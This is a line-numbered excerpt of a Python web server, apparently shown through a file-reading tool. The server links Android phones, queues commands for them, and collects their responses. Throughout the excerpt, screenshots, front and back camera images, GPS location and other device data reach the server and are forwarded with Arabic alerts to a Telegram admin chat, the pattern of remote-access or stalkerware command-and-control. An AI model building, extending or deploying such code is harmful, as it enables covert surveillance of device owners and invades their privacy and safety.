+   579→  2078→            "battery": device_info.get("battery", ""),
+   580→  2079→            "brand": device_info.get("brand", ""),
+   581→  2080→            "network": "",
+   582→  2081→            "location": "",
+   583→  2082→        }
+   584→  2083→        await add_device(device_data)
+   585→  2084→        await consume_link_code(link_code, device_id)
+   586→  2085→        
+   587→  2086→        # إشعار الأدمن
+   588→  2087→        await send_admin(
+   589→  2088→            f"📱 <b>تم ربط جهاز جديد!</b>\n\n"
+   590→  2089→            f"📱 الاسم: <code>{device_data['name']}</code>\n"
+   591→  2090→            f"🆔 المعرف: <code>{device_id}</code>\n"
+   592→  2091→            f"📱 الموديل: <code>{device_data['model']}</code>\n"
+   593→  2092→            f"🤖 النظام: <code>{device_data['os']}</code>",
+   594→  2093→            reply_markup=build_main_menu()
+   595→  2094→        )
+   596→  2095→        
+   597→  2096→        return web.json_response({
+   598→  2097→            "ok": True,
+   599→  2098→            "success": True,
+   600→  2099→            "device_id": device_id,
+   601→  2100→            "device_token": device_data["token"],
+   602→  2101→            "token": device_data["token"],
+   603→  2102→            "server_domain": SERVER_DOMAIN,
+   604→  2103→            "message": "تم تسجيل الجهاز بنجاح",
+   605→  2104→        })
+   606→  2105→    except Exception as exc:
+   607→  2106→        log.error("register error: %s", exc)
+   608→  2107→        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
+   609→  2108→
+   610→  2109→
+   611→  2110→async def api_get_commands(request):
+   612→  2111→    """GET /api/commands/{device_id} - Get pending commands."""
+   613→  2112→    global api_hits
+   614→  2113→    api_hits += 1
+   615→  2114→    device_id = request.match_info.get("device_id", "")
+   616→  2115→    if not device_id:
+   617→  2116→        device_id = request.query.get("device_id", "")
+   618→  2117→    
+   619→  2118→    if not device_id:
+   620→  2119→        return web.json_response({"ok": False, "error": "device_id required"}, status=400)
+   621→  2120→    
+   622→  2121→    # Validate device token
+   623→  2122→    device_token = request.headers.get("X-Device-Token", "")
+   624→  2123→    d = get_device_by_token(device_id, device_token)
+   625→  2124→    if not d:
+   626→  2125→        return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
+   627→  2126→    
+   628→  2127→    pending = get_pending_commands(device_id)
+   629→  2128→    
+   630→  2129→    # Mark as sent locally
+   631→  2130→    commands = load_json(COMMANDS_FILE, [])
+   632→  2131→    for c in commands:
+   633→  2132→        if c.get("device_id") == device_id and c.get("status") == "pending":
+   634→  2133→            c["status"] = "sent"
+   635→  2134→            c["sent_at"] = ts()
+   636→  2135→    save_json(COMMANDS_FILE, commands)
+   637→  2136→    
+   638→  2137→    # Note: Do NOT delete Firebase commands here. The app uses Firebase polling
+   639→  2138→    # (not this REST API), and the _firebase_push_cmd_async auto-deletes each
+   640→  2139→    # specific command after 60 seconds. Deleting ALL commands here would cause
+   641→  2140→    # a race condition with the app's processing.
+   642→  2141→    
+   643→  2142→    # Update last seen
+   644→  2143→    await update_device(device_id, {"active": True})
+   645→  2144→    
+   646→  2145→    # Track IP for upload identification
+   647→  2146→    peer_ip = _get_real_ip(request)
+   648→  2147→    if peer_ip and peer_ip != "127.0.0.1":
+   649→  2148→        _ip_device_map[peer_ip] = device_id
+   650→  2149→    
+   651→  2150→    return web.json_response({
+   652→  2151→        "ok": True,
+   653→  2152→        "commands": pending,
+   654→  2153→        "count": len(pending),
+   655→  2154→        "server_time": ts(),
+   656→  2155→    })
+   657→  2156→
+   658→  2157→
+   659→  2158→async def api_command_result(request):
+   660→  2159→    """POST /api/command_result/{command_id} - Submit command result.
+   661→  2160→    Forwards result to Telegram admin."""
+   662→  2161→    global api_hits, _processed_results
+   663→  2162→    api_hits += 1
+   664→  2163→    cmd_id = request.match_info.get("command_id", "")
+   665→  2164→    if not cmd_id:
+   666→  2165→        cmd_id = request.query.get("command_id", "")
+   667→  2166→    log.info("Command result received for cmd_id=%s from %s", cmd_id, request.remote)
+   668→  2167→    try:
+   669→  2168→        body = await request.json()
+   670→  2169→        status = body.get("status", "completed")
+   671→  2170→        result = body.get("result")
+   672→  2171→
+   673→  2172→        updated = await update_command_status(cmd_id, status, result)
+   674→  2173→        if not updated:
+   675→  2174→            return web.json_response({"ok": False, "error": "Command not found"}, status=404)
+   676→  2175→
+   677→  2176→        device_id = updated.get("device_id", "")
+   678→  2177→        # Validate device token for this command's device
+   679→  2178→        device_token = request.headers.get("X-Device-Token", "")
+   680→  2179→        if device_id and not get_device_by_token(device_id, device_token):
+   681→  2180→            return web.json_response({"ok": False, "error": "Unauthorized"}, status=401)
+   682→  2181→        command = updated.get("command", "")
+   683→  2182→        if device_id:
+   684→  2183→            await update_device(device_id, {"active": True})
+   685→  2184→
+   686→  2185→        # === Real-time alert: online/offline transition ===
+   687→  2186→        result_key = f"api:{cmd_id}"
+   688→  2187→        if result_key not in _processed_results:
+   689→  2188→            _processed_results.add(result_key)
+   690→  2189→            try:
+   691→  2190→                d = find_device(device_id) if device_id else None
+   692→  2191→                dev_name = d.get("name", device_id) if d else (device_id or "مجهول")
+   693→  2192→
+   694→  2193→                # Parse result and detect images
+   695→  2194→                b64_image = None
+   696→  2195→                display_text = str(result) if result else "تم بنجاح"
+   697→  2196→                if len(display_text) > 4000:
+   698→  2197→                    display_text = display_text[:4000] + "..."
+   699→  2198→
+   700→  2199→                try:
+   701→  2200→                    rj = json.loads(str(result))
+   702→  2201→                    if isinstance(rj, dict):
+   703→  2202→                        # Check for base64 image
+   704→  2203→                        for img_key in ("base64", "base64_preview", "image", "image_data"):
+   705→  2204→                            img_val = rj.get(img_key, "")
+   706→  2205→                            if img_val and len(img_val) > 1000:
+   707→  2206→                                b64_image = img_val
+   708→  2207→                                break
+   709→  2208→                        if rj.get("ok") and rj.get("message"):
+   710→  2209→                            display_text = rj["message"]
+   711→  2210→                        elif rj.get("ok") and isinstance(rj.get("data"), list):
+   712→  2211→                            count = len(rj["data"])
+   713→  2212→                            if count == 0:
+   714→  2213→                                display_text = "لا توجد بيانات"
+   715→  2214→                            elif count <= 15:
+   716→  2215→                                display_text = f"تم بنجاح - {count} عنصر\n\n<code>{json.dumps(rj['data'], ensure_ascii=False, indent=2)[:3000]}</code>"
+   717→  2216→                            else:
+   718→  2217→                                display_text = f"تم بنجاح - {count} عنصر (أول 10)\n\n<code>{json.dumps(rj['data'][:10], ensure_ascii=False, indent=2)[:2000]}</code>\n\n...و {count-10} أخرى"
+   719→  2218→                except Exception:
+   720→  2219→                    pass
+   721→  2220→
+   722→  2221→                cmd_desc = command or cmd_id
+   723→  2222→                for reg_name, reg_info in COMMAND_REGISTRY.items():
+   724→  2223→                    if reg_info.get("cmd") == command:
+   725→  2224→                        cmd_desc = reg_info.get("desc", command)
+   726→  2225→                        break
+   727→  2226→
+   728→  2227→                emoji = "✅" if status in ("completed", "success") else ("❌" if status == "error" else "📋")
+   729→  2228→
+   730→  2229→                # Try to EDIT the pending message first
+   731→  2230→                pending = _pending_messages.pop(cmd_id, None)
+   732→  2231→                batch_id = pending.get("batch_id") if pending else None
+   733→  2232→
+   734→  2233→                # === Send image directly for screenshots/camera ===
+   735→  2234→                img_sent = False
+   736→  2235→                if b64_image and command in ("screenshot", "front_camera", "back_camera"):
+   737→  2236→                    try:
+   738→  2237→                        import base64 as _b64
+   739→  2238→                        img_bytes = _b64.b64decode(b64_image)
+   740→  2239→                        if len(img_bytes) > 5000:
+   741→  2240→                            caption = f"{emoji} {dev_name} - {cmd_desc}"
+   742→  2241→                            photo_resp = await send_photo(ADMIN_CHAT_ID, img_bytes, caption=caption)
+   743→  2242→                            if photo_resp and photo_resp.get("ok"):
+   744→  2243→                                img_sent = True
+   745→  2244→                    except Exception:
+   746→  2245→                        pass
+   747→  2246→
+   748→  2247→                msg = (
+   749→  2248→                    f"{emoji} <b>نتيجة الأمر</b>\n\n"
+   750→  2249→                    f"📱 الجهاز: <code>{dev_name}</code>\n"
+   751→  2250→                    f"📋 الأمر: {cmd_desc}\n"
+   752→  2251→                    f"🆔 المعرف: <code>{cmd_id}</code>\n\n"
+   753→  2252→                    f"<code>{display_text}</code>"
+   754→  2253→                )
+   755→  2254→                if img_sent:
+   756→  2255→                    msg = f"{emoji} <b>{cmd_desc}</b>\n📱 <code>{dev_name}</code>\n\n<code>{display_text[:2000]}</code>"
+   757→  2256→
+   758→  2257→                msg_sent = False
+   759→  2258→                if pending and pending.get("message_id"):
+   760→  2259→                    try:
+   761→  2260→                        edit_resp = await edit_message_text(
+   762→  2261→                            pending["chat_id"], pending["message_id"],
+   763→  2262→                            msg, reply_markup=None
+   764→  2263→                        )
+   765→  2264→                        if edit_resp and edit_resp.get("ok"):
+   766→  2265→                            msg_sent = True
+   767→  2266→                            log.info("API result EDITED pending message: cmd=%s msg_id=%d", cmd_id, pending["message_id"])
+   768→  2267→                    except Exception as edit_err:
+   769→  2268→                        log.warning("Edit pending message error for cmd=%s: %s", cmd_id, edit_err)
+   770→  2269→
+   771→  2270→                if not msg_sent:
+   772→  2271→                    if batch_id and batch_id in _batch_operations:
+   773→  2272→                        _batch_operations[batch_id]["responded"] += 1
+   774→  2273→                        await update_batch_progress(batch_id)
+   775→  2274→                    else:
+   776→  2275→                        await send_admin(msg)
+   777→  2276→                elif batch_id and batch_id in _batch_operations:
+   778→  2277→                    _batch_operations[batch_id]["responded"] += 1
+   779→  2278→                    await update_batch_progress(batch_id)
+   780→  2279→                log.info("API result FORWARDED to Telegram: cmd=%s", cmd_id)
+   781→  2280→            except Exception as send_err:
+   782→  2281→                log.error("Failed to forward API result: %s", send_err)
+   783→  2282→
+   784→  2283→        return web.json_response({"ok": True, "success": True, "message": "Result received"})
+   785→  2284→    except Exception as exc:
+   786→  2285→        log.error("command_result error: %s", exc)
+   787→  2286→        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
+   788→  2287→
+   789→  2288→async def api_heartbeat(request):
+   790→  2289→    """POST /api/heartbeat - Receive heartbeat from device."""
+   791→  2290→    global api_hits
+   792→  2291→    api_hits += 1
+   793→  2292→    try:
+   794→  2293→        body = await request.json()
+   795→  2294→        device_id = body.get("device_id", "")
+   796→  2295→        status_val = body.get("status", "online")
+   797→  2296→        battery = body.get("battery", 0)
+   798→  2297→        
+   799→  2298→        if not device_id:
+   800→  2299→            return web.json_response({"ok": False, "error": "device_id required"}, status=400)
+   801→  2300→        
+   802→  2301→        # Validate device token
+   803→  2302→        device_token = request.headers.get("X-Device-Token", "")
+   804→  2303→        if not get_device_by_token(device_id, device_token):
+   805→  2304→            return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
+   806→  2305→        
+   807→  2306→        is_online = status_val == "online"
+   808→  2307→        await update_device(device_id, {
+   809→  2308→            "active": is_online,
+   810→  2309→            "battery": str(battery),
+   811→  2310→        })
+   812→  2311→
+   813→  2312→        # === Real-time alert: online/offline transition ===
+   814→  2313→        was_online = _device_last_online_state.get(device_id, None)
+   815→  2314→        if was_online is not None and was_online != is_online:
+   816→  2315→            d = find_device(device_id)
+   817→  2316→            dev_name = d.get("name", device_id) if d else device_id
+   818→  2317→            if is_online:
+   819→  2318→                try:
+   820→  2319→                    await send_admin(
+   821→  2320→                        f"🟢 <b>الجهاز متصل</b>\n\n"
+   822→  2321→                        f"📱 {dev_name} (<code>{device_id}</code>)\n"
+   823→  2322→                        f"🔋 البطارية: {battery}%\n"
+   824→  2323→                        f"🕐 {ts()}",
+   825→  2324→                        disable_notification=True
+   826→  2325→                    )
+   827→  2326→                except Exception:
+   828→  2327→                    pass
+   829→  2328→            else:
+   830→  2329→                try:
+   831→  2330→                    await send_admin(
+   832→  2331→                        f"🔴 <b>الجهاز غير متصل</b>\n\n"
+   833→  2332→                        f"📱 {dev_name} (<code>{device_id}</code>)\n"
+   834→  2333→                        f"🕐 {ts()}",
+   835→  2334→                        disable_notification=True
+   836→  2335→                    )
+   837→  2336→                except Exception:
+   838→  2337→                    pass
+   839→  2338→            append_event(f"Device {'online' if is_online else 'offline'}", {"device_id": device_id, "battery": battery})
+   840→  2339→        _device_last_online_state[device_id] = is_online
+   841→  2340→
+   842→  2341→        # === Real-time alert: low battery ===
+   843→  2342→        try:
+   844→  2343→            battery_int = int(battery)
+   845→  2344→            if 0 <= battery_int < LOW_BATTERY_THRESHOLD:
+   846→  2345→                last_alert_time = _device_last_battery_alert.get(device_id, 0)
+   847→  2346→                now = time.time()
+   848→  2347→                # Only alert once every 10 minutes per device
+   849→  2348→                if now - last_alert_time >= 600:
+   850→  2349→                    d = find_device(device_id)
+   851→  2350→                    dev_name = d.get("name", device_id) if d else device_id
+   852→  2351→                    try:
+   853→  2352→                        await send_admin(
+   854→  2353→                            f"⚠️ <b>بطارية منخفضة!</b>\n\n"
+   855→  2354→                            f"📱 {dev_name} (<code>{device_id}</code>)\n"
+   856→  2355→                            f"🔋 المستوى: <b>{battery_int}%</b>\n"
+   857→  2356→                            f"🕐 {ts()}",
+   858→  2357→                            disable_notification=True
+   859→  2358→                        )
+   860→  2359→                    except Exception:
+   861→  2360→                        pass
+   862→  2361→                    _device_last_battery_alert[device_id] = now
+   863→  2362→                    append_event("Low battery alert", {"device_id": device_id, "battery": battery_int})
+   864→  2363→        except (ValueError, TypeError):
+   865→  2364→            pass
+   866→  2365→
+   867→  2366→        # Track IP for upload identification
+   868→  2367→        peer_ip = _get_real_ip(request)
+   869→  2368→        if peer_ip and peer_ip != "127.0.0.1":
+   870→  2369→            _ip_device_map[peer_ip] = device_id
+   871→  2370→        log.info("Heartbeat from %s: battery=%d%% status=%s ip=%s", device_id, battery, status_val, peer_ip)
+   872→  2371→        
+   873→  2372→        return web.json_response({"ok": True, "success": True, "message": "Heartbeat received"})
+   874→  2373→    except Exception as exc:
+   875→  2374→        log.error("heartbeat error: %s", exc)
+   876→  2375→        return web.json_response({"ok": True, "success": True})  # لا نريد فشل الـ heartbeat
+   877→  2376→
+   878→  2377→
+   879→  2378→async def api_device_data(request):
+   880→  2379→    """POST /api/data/{device_id} - Receive data from device."""
+   881→  2380→    global api_hits
+   882→  2381→    api_hits += 1
+   883→  2382→    device_id = request.match_info.get("device_id", "")
+   884→  2383→    log.info("Device data received from device_id=%s", device_id)
+   885→  2384→    try:
+   886→  2385→        body = await request.json()
+   887→  2386→        data_type = body.get("type", "")
+   888→  2387→        data = body.get("data", {})
+   889→  2388→        
+   890→  2389→        # Validate device token
+   891→  2390→        device_token = request.headers.get("X-Device-Token", "")
+   892→  2391→        d = get_device_by_token(device_id, device_token)
+   893→  2392→        if not d:
+   894→  2393→            return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
+   895→  2394→        
+   896→  2395→        dev_name = d.get("name", device_id)
+   897→  2396→        await update_device(device_id, {"active": True})
+   898→  2397→        
+   899→  2398→        # Handle different data types
+   900→  2399→        if data_type == "location":
+   901→  2400→            lat = data.get("lat", "")
+   902→  2401→            lon = data.get("lon", "")
+   903→  2402→            await update_device(device_id, {"location": f"{lat},{lon}"})
+   904→  2403→            loc_key = f"{device_id}:location"
+   905→  2404→            loc_now = time.time()
+   906→  2405→            if loc_now - _data_forward_dedup.get(loc_key, 0) >= 120:
+   907→  2406→                await send_admin(
+   908→  2407→                    f"📍 <b>Location Update</b>\n"
+   909→  2408→                    f"📱 {dev_name}\n"
+   910→  2409→                    f"🧭 <a href='https://maps.google.com/?q={lat},{lon}'>View Map</a>",
+   911→  2410→                    disable_notification=True
+   912→  2411→                )
+   913→  2412→                _data_forward_dedup[loc_key] = loc_now
+   914→  2413→
+   915→  2414→        elif data_type == "battery":
+   916→  2415→            level = data.get("level", "?")
+   917→  2416→            await update_device(device_id, {"battery": level})
+   918→  2417→            # Low battery alert from data endpoint
+   919→  2418→            try:
+   920→  2419→                level_int = int(level)
+   921→  2420→                if 0 <= level_int < LOW_BATTERY_THRESHOLD:
+   922→  2421→                    last_alert_time = _device_last_battery_alert.get(device_id, 0)
+   923→  2422→                    now_ts = time.time()
+   924→  2423→                    if now_ts - last_alert_time >= 600:
+   925→  2424→                        try:
+   926→  2425→                            await send_admin(
+   927→  2426→                                f"⚠️ <b>بطارية منخفضة!</b>\n\n"
+   928→  2427→                                f"📱 {dev_name} (<code>{device_id}</code>)\n"
+   929→  2428→                                f"🔋 المستوى: <b>{level_int}%</b>\n"
+   930→  2429→                                f"🕐 {ts()}",
+   931→  2430→                                disable_notification=True
+   932→  2431→                            )
+   933→  2432→                        except Exception:
+   934→  2433→                            pass
+   935→  2434→                        _device_last_battery_alert[device_id] = now_ts
+   936→  2435→            except (ValueError, TypeError):
+   937→  2436→                pass
+   938→  2437→        elif data_type == "screenshot" or data_type == "camera":
+   939→  2438→            img_data = data.get("image", "")
+   940→  2439→            if img_data and len(img_data) > 100:
+   941→  2440→                import base64
+   942→  2441→                try:
+   943→  2442→                    await send_photo(ADMIN_CHAT_ID, base64.b64decode(img_data),
+   944→  2443→                                     caption=f"📷 {data_type} from {dev_name}")
+   945→  2444→                except Exception:
+   946→  2445→                    await send_admin(f"📷 {data_type} from {dev_name}\n(Image data received)", disable_notification=True)
+   947→  2446→        else:
+   948→  2447→            # Generic data forward - with dedup
+   949→  2448→            fwd_key = f"{device_id}:{data_type}"
+   950→  2449→            fwd_now = time.time()
+   951→  2450→            if fwd_now - _data_forward_dedup.get(fwd_key, 0) < 120:
+   952→  2451→                log.info("Data dedup: skipped %s for %s", data_type, device_id)
+   953→  2452→                return web.json_response({"ok": True, "success": True, "message": "Data received (dedup)"})
+   954→  2453→            data_str = json.dumps(data, ensure_ascii=False)[:3000] if data else "Empty"
+   955→  2454→            await send_admin(
+   956→  2455→                f"📦 <b>Data Received</b>\n"
+   957→  2456→                f"📱 {dev_name}\n"
+   958→  2457→                f"📋 Type: <code>{data_type}</code>\n\n"
+   959→  2458→                f"<code>{data_str}</code>",
+   960→  2459→                disable_notification=True
+   961→  2460→            )
+   962→  2461→        
+   963→  2462→        append_event(f"Data received: {data_type}", {"device_id": device_id})
+   964→  2463→        
+   965→  2464→        return web.json_response({"ok": True, "success": True, "message": "Data received"})
+   966→  2465→    except Exception as exc:
+   967→  2466→        log.error("device_data error: %s", exc)
+   968→  2467→        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
+   969→  2468→
+   970→  2469→
+   971→  2470→async def api_device_data_body(request):
+   972→  2471→    """POST /api/data - Receive data from device (body contains device_id).
+   973→  2472→    يدعم الشكل الذي يرسله التطبيق: {device_id, command, data, timestamp}
+   974→  2473→    Forwards data to Telegram admin."""
+   975→  2474→    global api_hits
+   976→  2475→    api_hits += 1
+   977→  2476→    try:
+   978→  2477→        body = await request.json()
+   979→  2478→        device_id = body.get("device_id", "")
+   980→  2479→        command = body.get("command", "")
+   981→  2480→        data = body.get("data", {})
+   982→  2481→
+   983→  2482→        if not device_id:
+   984→  2483→            return web.json_response({"ok": False, "success": False, "error": "device_id required"}, status=400)
+   985→  2484→
+   986→  2485→        # Validate device token
+   987→  2486→        device_token = request.headers.get("X-Device-Token", "")
+   988→  2487→        d = get_device_by_token(device_id, device_token)
+   989→  2488→        if not d:
+   990→  2489→            return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
+   991→  2490→
+   992→  2491→        dev_name = d.get("name", device_id)
+   993→  2492→        await update_device(device_id, {"active": True})
+   994→  2493→        append_event(f"Data received: {command}", {"device_id": device_id})
+   995→  2494→
+   996→  2495→        # === ANTI-SPAM DEDUP: Prevent forwarding same data repeatedly ===
+   997→  2496→        body_dedup_key = f"{device_id}:{command}"
+   998→  2497→        body_dedup_now = time.time()
+   999→  2498→        body_dedup_entry = _data_body_dedup.get(body_dedup_key, {})
+  1000→  2499→        body_data_str = json.dumps(data, ensure_ascii=False, sort_keys=True) if data else ""
+  1001→
+  1002→[showing lines 1500-2499 of 5555; use offset=2500 with limit to continue reading]
